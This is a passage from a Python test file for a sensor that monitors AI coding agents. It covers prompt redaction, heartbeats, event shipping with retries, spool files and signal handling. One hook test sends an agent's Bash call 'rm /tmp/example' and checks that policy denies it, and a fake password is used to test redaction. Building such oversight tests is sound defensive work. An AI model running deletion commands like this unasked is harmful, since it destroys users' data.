            "gemini_cli": {"enabled": False},
        },
    )
    sensor = Sensor(config)
    try:
        sensor.emit(
            {"kind": "prompt", "session": {"id": "s"}, "text": "password=hunter22"}
        )
        event = sensor.spool.read()["events"][0]
        assert event["redacted"] and "hunter22" not in event["text"]
        sensor.apply({"disabled": True})
        sensor.emit({"kind": "prompt", "session": {"id": "s"}, "text": "hello"})
        assert sensor.spool.depth == 1 and sensor.dropped == 1
        sensor.emit({"kind": "sensor", "text": "status"})
        assert sensor.spool.depth == 2
        parser = Parser("codex-cli", str(tmp_path / "private-project" / "rollout.jsonl"))
        parser.session = {"id": "private-session", "cwd": "private-project"}
        parser.session_known = True
        gap = parser.gap("parser_restart")[0]
        sensor.emit(gap)
        assert sensor.spool.depth == 2 and sensor.dropped == 2
        assert "private-project" not in json.dumps(sensor.spool.read()["events"])
        sensor.apply({"disabled": False})
        sensor.emit(gap)
        assert sensor.spool.depth == 3
        # A reply that cannot be applied must not publish first-heartbeat
        # readiness while the sensor's administrative state is still unknown.
        sensor.client.post = lambda *_: {"disabled": True, "config": {"heartbeat_interval_s": "invalid"}}
        sensor.heartbeat_once()
        assert sensor.status()["last_heartbeat_at"] is None
        assert sensor.heartbeat_error
        # A slow queue read can overlap the first successful heartbeat.
        # Status must not combine that heartbeat with the earlier enabled flag.
        sensor.client.post = lambda *_: {"disabled": True}
        pending = True
        open_file = Path.open

        def read_during_heartbeat(path, *args, **kwargs):
            nonlocal pending
            if pending and path == sensor.spool.current and args == ("rb",):
                pending = False
                sensor.heartbeat_once()
            return open_file(path, *args, **kwargs)

        with monkeypatch.context() as patch:
            patch.setattr(Path, "open", read_during_heartbeat)
            snapshot = sensor.status()
        assert not pending and sensor.last_heartbeat and sensor.disabled
        assert snapshot["last_heartbeat_at"] is None or snapshot["disabled"]
        # Old servers can still return rules; only backend version metadata is retained.
        sent = []

        def post(path, body):
            assert body["policy_delivery"] == "backend" and "policy_actions" not in body
            sent.append(body["policy_version"])
            if len(sent) == 1:
                raise OSError("network down")
            if len(sent) == 2:
                return {}
            return {"policy": {"version": 3, "rules": "ignored"}}

        sensor.client.post = post
        sensor.apply({"commands": [{"id": "refresh", "type": "refresh_policy"}]})
        assert sensor.wake.is_set()
        for _ in range(4):
            sensor.heartbeat_once()
        assert sent == [0, 0, 0, 3]
        assert not (tmp_path / "policy.json").exists()
        assert sensor.status()["last_heartbeat_at"] and not sensor.heartbeat_error
    finally:
        sensor.client.close()


def test_sensor_heartbeat_refreshes_tenant_name_with_older_server_fallback(tmp_path, monkeypatch):
    config = Config(tmp_path / "config", server_url="http://localhost", sensor_id="s",
                    sensor_token="t", data_dir=str(tmp_path), telemetry={"enabled": False},
                    inventory={"enabled": False})
    from openaidr.sensor import hostinfo

    reports = iter([
        {"name": "alice", "signed_in_at": "2026-01-01T00:00:00+00:00"},
        {"name": "bob", "signed_in_at": "2026-01-02T00:00:00+00:00"},
        None, None, None,
    ])
    monkeypatch.setattr(hostinfo, "signed_in_user", lambda: next(reports))
    sent = []
    sensor = Sensor(config)
    try:
        assert sensor.status()["tenant_name"] == ""
        for response, expected in [
            ({"tenant_name": "Example organization"}, "Example organization"),
            ({"tenant_name": "Renamed organization"}, "Renamed organization"),
            ({}, ""),
            ({"tenant_name": None}, ""),
            ({"tenant_name": {"name": "invalid"}}, ""),
        ]:
            sensor.client.post = lambda path, body: sent.append(body) or response
            sensor.heartbeat_once()
            assert sensor.status()["tenant_name"] == expected
            assert sensor.last_heartbeat and not sensor.heartbeat_error
        assert [body.get("signed_in_user", {}).get("name") for body in sent] == ["alice", "bob", None, None, None]
        assert all("signed_in_user" not in body for body in sent[2:])
    finally:
        sensor.client.close()
        sensor.spool.close()


def test_sensor_heartbeat_cloud_status_excludes_legacy_private_accounting(tmp_path):
    from openaidr.core.cloud_protection import FIELDS, project

    config = Config(tmp_path / "config", server_url="http://localhost", sensor_id="s",
                    sensor_token="t", data_dir=str(tmp_path), telemetry={"enabled": False},
                    inventory={"enabled": False})
    legacy = dict(state="active", checked_at=time.time(), guardrail_available=True, guardrail_configured=True,
                  allowance_nanos=2000000000, spent_nanos=1, reserved_nanos=2, remaining_nanos=1999999997,
                  resets_at="2026-11-01T00:00:00Z")
    sensor = Sensor(config)
    try:
        for envelope, state in [
            ({"cloud_credit":legacy}, "active"),
            ({"cloud_protection":project(legacy)}, "active"),
            ({"cloud_credit":{**legacy, "model":"private-model", "usage":{"tokens":123}}}, "unavailable"),
            ({"cloud_credit":legacy, "cloud_protection":{}}, "unavailable"),
        ]:
            sensor.client.post = lambda path, body: envelope
            sensor.heartbeat_once()
            assert "cloud_credit" not in sensor.status()  # Old desktop consumers must not infer a zero balance.
            public = sensor.status()["cloud_protection"]
            assert set(public) == FIELDS and public["state"] == state
            assert public["credit_status"] in (None, "unavailable")
            assert not any(key in json.dumps(public) for key in ("_nanos", "model", "provider", "tokens"))
        for envelope in ({}, {"cloud_credit":legacy, "cloud_protection":None}):
            sensor.client.post = lambda path, body: envelope
            sensor.heartbeat_once()
            assert sensor.status()["cloud_protection"] is None
    finally:
        sensor.client.close()
        sensor.spool.close()


def test_sensor_process_metrics_warmup_zero_multicore_and_collection_failure(monkeypatch):
    from types import SimpleNamespace
    from openaidr.sensor import metrics

    cpu = iter([0.0, 125.5, 0.0, 4.0, OSError("unavailable"), 12.0, 7.0])
    memory = iter([32 * 1024**2, 16 * 1024**2, 0, metrics.psutil.AccessDenied(), 64 * 1024**2, 48 * 1024**2, 16 * 1024**2])

    def read(values):
        value = next(values)
        if isinstance(value, Exception):
            raise value
        return value

    process = SimpleNamespace(
        cpu_percent=lambda interval: read(cpu),
        memory_info=lambda: SimpleNamespace(rss=read(memory)),
    )
    monkeypatch.setattr(metrics.psutil, "Process", lambda: process)
    sampler = metrics.ProcessMetrics()
    samples = [sampler.sample() for _ in range(7)]
    assert [sample["cpu_percent"] for sample in samples] == [None, 125.5, 0, 4, None, None, 7]
    assert [sample["memory_rss_bytes"] for sample in samples] == [32 * 1024**2, 16 * 1024**2, 0, None, 64 * 1024**2, 48 * 1024**2, 16 * 1024**2]


@pytest.mark.parametrize("timeout", ["read", "connect", "bad_request"])
def test_upload_timeout_preserves_records_and_adapts_only_slow_responses(tmp_path, monkeypatch, timeout):
    import httpx

    config = Config(tmp_path / "config", server_url="https://backend.example", sensor_id="s",
                    sensor_token="token", data_dir=str(tmp_path / "data"),
                    telemetry={"enabled": False}, inventory={"enabled": False})
    sensor = Sensor(config)
    sensor.server_config["flush_interval_s"] = .01
    stop = threading.Event()
    batches, received = [], set()
    for i in range(12):
        sensor.spool.append({"id": str(i)})

    def post(path, body):
        assert path == "events"
        ids = [event["id"] for event in body["events"]]
        batches.append(ids)
        if len(batches) == 1:
            if timeout == "read":
                # Some records committed before the response was lost.
                received.update(ids[:3])
                raise httpx.ReadTimeout("response unavailable")
            if timeout == "bad_request":
                httpx.Response(400, request=httpx.Request("POST", "https://backend.example/ingest/v1/events")).raise_for_status()
            raise httpx.ConnectTimeout("connection unavailable")
        duplicates = len(set(ids) & received)
        received.update(ids)
        if received == {str(i) for i in range(12)}:
            stop.set()
        return {"accepted": len(ids) - duplicates, "duplicates": duplicates, "rejected": []}

    monkeypatch.setattr(sensor.client, "post", post)
    worker = threading.Thread(target=sensor.ship_loop, args=(stop,), daemon=True)
    started = time.monotonic()
    worker.start()
    sensor.ship_wake.set()
    try:
        worker.join(5)
        assert not worker.is_alive()
        assert time.monotonic() - started >= 1, "timeout retries must keep their backoff"
        assert [len(batch) for batch in batches] == ([12, 6, 6] if timeout == "read" else [12, 12])
        assert batches[1] == batches[0][:len(batches[1])]
        assert sensor.spool.depth == 0 and sensor.spool.dropped == 0
        assert sensor.ship["failures"] == 1 and sensor.ship["last_error"] == ""
        assert sensor.ship["duplicates"] == (3 if timeout == "read" else 0)
        assert sensor.ship["shipped"] + sensor.ship["duplicates"] == 12
        assert sensor.ship["batch_max"] == (6 if timeout == "read" else 500)
    finally:
        stop.set()
        sensor.ship_wake.set()
        worker.join(2)
        sensor.hook_clients.close()
        sensor.client.close()
        sensor.spool.close()


@pytest.mark.parametrize("response_text", [True, False])
def test_sensor_live_hook_listener_and_delivery(tmp_path, monkeypatch, backend_hook, response_text):
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    import socket
    import httpx

    received = []

    class Ingest(BaseHTTPRequestHandler):
        def log_message(self, *_):
            pass

        def do_POST(self):
            body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
            received.append((self.path, body, self.headers.get("Authorization")))
            if self.path.endswith("/heartbeat"):
                result = {"disabled": False}
            elif self.path.endswith("/version"):
                result = {"version": "0.2.0"}
            elif self.path.endswith("/hook-checks"):
                action = "deny" if body["hook_event"] == "PreToolUse" else "allow"
                result = backend_hook(action=action)(body, None)
                result["request_id"] = body["request_id"]
            else:
                result = {
                    "accepted": len(body.get("events", [])),
                    "duplicates": 0,
                    "rejected": [],
                }
            data = json.dumps(result).encode()
            self.send_response(200)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            self.wfile.flush()

    ingest = ThreadingHTTPServer(("127.0.0.1", 0), Ingest)

    def unexpected_lookup(*args):
        raise AssertionError("Local listeners must not resolve hostnames")

    monkeypatch.setattr(socket, "getfqdn", unexpected_lookup)
    ingest_thread = threading.Thread(target=ingest.serve_forever, daemon=True)
    ingest_thread.start()
    with socket.socket() as reservation:
        reservation.bind(("127.0.0.1", 0))
        port = reservation.getsockname()[1]
    config = Config(
        tmp_path / "config",
        server_url=f"http://127.0.0.1:{ingest.server_port}",
        sensor_id="s",
        sensor_token="token",
        data_dir=str(tmp_path),
        listen=f"127.0.0.1:{port}",
        capture={"response_text": response_text},
        collectors={
            name: {"enabled": False}
            for name in ("claude_code", "codex_cli", "gemini_cli")
        },
        # The OTLP receiver would bind the default port 4318 and fail on a
        # machine where a real sensor runs; this test covers hooks and shipping.
        telemetry={"enabled": False},
        inventory={"enabled": False},
    )
    sensor = Sensor(config)
    # Shipping is woken by emit; the flush interval alone would take far
    # longer than this test allows.
    sensor.server_config["flush_interval_s"] = 30
    completed = []
    post = sensor.client.post

    def track_post(path, body):
        result = post(path, body)
        completed.append(path)
        return result

    sensor.client.post = track_post
    stop = threading.Event()
    errors = []

    def run():
        try:
            sensor.run(stop)
        except Exception as exc:
            errors.append(exc)

    runner = threading.Thread(target=run, daemon=True)
    runner.start()
    try:
        deadline = time.monotonic() + 5
        while True:
            try:
                status = hooks.local_request(config, "GET", "/v1/status")
                break
            except httpx.TransportError:
                assert time.monotonic() < deadline
                time.sleep(0.01)
        assert status["sensor_id"] == "s"
        response = hooks.local_request(
            config,
            "POST",
            "/v1/hooks/claude-code?event=PreToolUse",
            json={
                "session_id": "session",
                "tool_name": "Bash",
                "tool_input": {"command": "rm /tmp/example"},
            },
        )
        assert response["decision"] == "deny"
        codex = hooks.local_request(
            config,
            "POST",
            "/v1/hooks/codex?event=UserPromptSubmit",
            json={"session_id": "thr_1", "cwd": "/repo", "prompt": "hello codex"},
        )
        assert codex["decision"] == "allow" and codex["output"] == {}
        for product in ("claude-code", "codex"):
            stopped = hooks.local_request(
                config, "POST", f"/v1/hooks/{product}?event=Stop",
                json={"session_id": product + "-session", "stop_hook_active": False,
                      "last_assistant_message": "Completed the requested changes."},
            )
            assert stopped["decision"] == "allow" and stopped["output"] == {}
        submitted = [body for path, body, _ in received if path.endswith("/hook-checks")]
        assert len(submitted) == 2
        assert submitted[0]["actions"][0]["command"]["text"] == "rm /tmp/example"
        assert submitted[1]["actions"][0]["text"] == "hello codex"
        sent = time.monotonic()
        deadline = sent + 5
        while not any(
            path.endswith("/events")
            and any(e["kind"] == "prompt" and e["text"] == "hello codex" for e in body["events"])
            for path, body, _ in received
        ) or sum(e["kind"] == "response" for _, body, _ in received
                 for e in body.get("events", [])) < 2 or not {"events", "heartbeat", "version"}.issubset(completed):
            assert time.monotonic() < deadline
            time.sleep(0.01)
        assert time.monotonic() - sent < 3
        shipped = [e for _, body, _ in received for e in body.get("events", [])]
        assert any(e["kind"] == "hook.decision" for e in shipped)
        prompt = next(e for e in shipped if e["kind"] == "prompt")
        assert prompt["agent"]["product"] == "codex-cli" and prompt["source"]["collector"] == "hook"
        responses = [e for e in shipped if e["kind"] == "response"]
        assert len(responses) == 2
        assert {e["agent"]["product"] for e in responses} == {"claude-code", "codex-cli"}
        assert all(e["source"]["collector"] == "hook" for e in responses)
        assert all(e.get("text") == ("Completed the requested changes." if response_text else None)
                   for e in responses)
        assert all(auth == "Bearer token" for _, _, auth in received)
        heartbeat = next(body for path, body, _ in received if path.endswith("/heartbeat"))
        assert set(heartbeat["device"]) == set(hostinfo.DEVICE_FIELDS)
        assert heartbeat["cpu_percent"] is None
        assert heartbeat["memory_rss_bytes"] > 0
        assert heartbeat["policy_delivery"] == "backend" and heartbeat["policy_version"] == 0
        assert "policy_actions" not in heartbeat and not (tmp_path / "policy.json").exists()
        # The service checks for updates without any desktop window or IPC action.
        deadline = time.monotonic() + 5
        while True:
            status = hooks.local_request(config, "GET", "/v1/status")
            if status["update"].get("latest") == "0.2.0":
                break
            assert time.monotonic() < deadline
            time.sleep(0.01)
        assert status["update"]["checked_at"]
        assert sum(path.endswith("/version") for path, _, _ in received) == 1
    finally:
        stop.set()
        runner.join(5)
        ingest.shutdown()
        ingest.server_close()
    assert not runner.is_alive() and not errors


def test_spool_monotonic_segments_and_stale_ack(tmp_path, monkeypatch):
    monkeypatch.setattr("openaidr.sensor.spool.time.time_ns", lambda: 123)
    spool = Spool(tmp_path, max_segment_bytes=1)
    spool.append({"id": "a"})
    first = spool.read(1)
    spool.append({"id": "b"})
    second = spool.read(2)
    assert [p.name for p in spool.segments()] == [
        "00000000000000000123.jsonl",
        "00000000000000000124.jsonl",
    ]
    spool.ack(second)
    spool.ack(first)
    assert spool.depth == 0
    spool.close()
    reopened = Spool(tmp_path, max_segment_bytes=1)
    reopened.append({"id": "c"})
    assert reopened.read()["events"] == [{"id": "c"}]


def test_go_spool_and_offset_compatibility(tmp_path):
    spool_dir = tmp_path / "spool"
    spool_dir.mkdir()
    segment = "01760000000000000000.jsonl"
    first = b'{"id":"acked"}\n'
    (spool_dir / segment).write_bytes(first + b'{"id":"pending"}\n')
    (spool_dir / "cursor.json").write_text(
        json.dumps({"segment": segment, "offset": len(first)})
    )
    spool = Spool(spool_dir)
    assert spool.depth == 1 and spool.read()["events"] == [{"id": "pending"}]
    offset_path = tmp_path / "offsets.json"
    offset_path.write_text(
        json.dumps(
            {
                "claude-code|/home/a/log.jsonl": {
                    "offset": 42,
                    "line": 3,
                    "id": "1:2",
                    "size": 42,
                    "started": True,
                }
            }
        )
    )
    assert Offsets(offset_path).get("claude-code", "/home/a/log.jsonl")["offset"] == 42


def test_stop_signals_remain_safe_during_shutdown():
    # systemd and the frozen launcher both send SIGTERM. A handler that took
    # the Event's lock deadlocked when it ran while the main thread held it.
    script = """
import signal, socket, threading
from openaidr.sensor.cli import stop_on_signals

def assert_socket_untouched():
    reader, writer = socket.socketpair()
    with reader, writer:
        reader.setblocking(False)
        signal.raise_signal(signal.SIGTERM)
        try:
            data = reader.recv(1)
        except BlockingIOError:
            pass
        else:
            raise AssertionError(f"signal wrote to an unrelated socket: {data!r}")

stop = threading.Event()
previous_handler = lambda *_: None
signal.signal(signal.SIGTERM, previous_handler)
before = set(threading.enumerate())
with stop_on_signals(stop):
    worker, = set(threading.enumerate()) - before
    if hasattr(signal, "SIGALRM"):
        signal.signal(signal.SIGALRM, lambda *_: None)
        signal.raise_signal(signal.SIGALRM)
        assert not stop.wait(0.5), "an unrelated signal stopped the sensor"
    with stop._cond:
        signal.raise_signal(signal.SIGTERM)
        signal.raise_signal(signal.SIGTERM)
        signal.raise_signal(signal.SIGINT)
    assert stop.wait(5)
    worker.join(5)
    assert not worker.is_alive()
    assert_socket_untouched()
assert signal.getsignal(signal.SIGTERM) is previous_handler
assert_socket_untouched()
assert signal.set_wakeup_fd(-1) == -1
"""
    result = subprocess.run([sys.executable, "-c", script], capture_output=True, text=True, timeout=20)
    assert result.returncode == 0, result.stderr
    assert not result.stderr


@pytest.mark.parametrize("failure", ["none", "body", "setup"])
def test_stop_signals_restore_state_without_a_stop_signal(failure):
    script = """
import signal, socket, sys, threading
from openaidr.sensor.cli import stop_on_signals

failure = sys.argv[1]
stop = threading.Event()
previous_handler = lambda *_: None
for number in (signal.SIGINT, signal.SIGTERM):
    signal.signal(number, previous_handler)
previous_reader, previous_writer = socket.socketpair()
with previous_reader, previous_writer:
    previous_writer.setblocking(False)
    previous_reader.settimeout(1)
    previous_fd = signal.set_wakeup_fd(previous_writer.fileno())
    before = set(threading.enumerate())
    try:
        signals = (signal.SIGINT, signal.SIGTERM, -1) if failure == "setup" else (signal.SIGINT, signal.SIGTERM)
        try:
            with stop_on_signals(stop, signals):
                if failure == "body":
                    raise RuntimeError("sensor failed")
        except (RuntimeError, ValueError) as exc:
            assert type(exc) is (RuntimeError if failure == "body" else ValueError)
            assert failure != "none"
        else:
            assert failure == "none"
        assert set(threading.enumerate()) == before, "signal reader leaked"
        assert not stop.is_set(), "cleanup should not request a stop"
        for number in (signal.SIGINT, signal.SIGTERM):
            assert signal.getsignal(number) is previous_handler
        signal.raise_signal(signal.SIGTERM)
        assert previous_reader.recv(1) == bytes([signal.SIGTERM])
        assert signal.set_wakeup_fd(-1) == previous_writer.fileno()
    finally:
        signal.set_wakeup_fd(previous_fd)
"""
    result = subprocess.run([sys.executable, "-c", script, failure], capture_output=True, text=True, timeout=20)
    assert result.returncode == 0, result.stderr
    assert not result.stderr


def test_collector_health_clears_after_all_sources_recover(tmp_path):
    first, second = tmp_path / 'first.jsonl', tmp_path / 'second.jsonl'
    record = {'sessionId': 'test-session', 'type': 'user', 'message': {'role': 'user', 'content': 'test'}}
    for path in (first, second):
        path.write_text(json.dumps(record) + '\n')
    failing = True
    events = []

    def emit(event):
        if failing:
            raise OSError('source storage is unavailable')
        events.append(event)

    collector = Collector('claude-code', [], [str(tmp_path / '*.jsonl')],
                          Offsets(tmp_path / 'offsets.json'), backfill=True, emit=emit)
    collector.poll(initial=True)
    assert collector.status()['error'] == 'source storage is unavailable'
    assert not events
    failing = False
    collector.poll()
    assert collector.status()['error'] == ''
    assert len([event for event in events if event['kind'] == 'prompt']) == 2
    collector.poll()
    assert collector.status()['error'] == ''
